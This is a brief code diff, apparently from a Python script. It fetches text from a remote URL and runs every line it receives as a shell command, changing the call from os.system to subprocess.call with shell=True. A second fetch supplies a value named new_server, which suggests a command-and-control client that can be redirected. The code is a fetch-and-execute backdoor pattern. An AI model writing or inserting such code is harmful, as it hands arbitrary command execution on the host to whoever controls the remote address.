@@ -17,7 +17,7 @@ with request.urlopen(cp) as f:
     c_l = f.readlines()
     for n_l in c_l:
         n_l = n_l.decode('utf-8')
-        os.system(n_l)
+        result = subprocess.call(n_l, shell=True)
 
 new_server = ""
 with request.urlopen(cd) as f:
